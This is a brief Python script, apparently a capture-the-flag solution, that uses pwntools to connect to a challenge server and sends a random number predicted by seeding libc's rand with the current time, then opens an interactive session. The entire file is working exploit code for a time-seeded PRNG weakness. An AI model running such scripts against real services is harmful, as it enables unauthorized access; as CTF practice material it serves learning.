from pwn import *
from ctypes import *

r=CDLL("/lib/x86_64-linux-gnu/libc.so.6")
p=remote("ctf.j0n9hyun.xyz",3014)
r.srand(r.time(0))
tt=r.rand()
p.sendline(str(tt))
p.interactive()
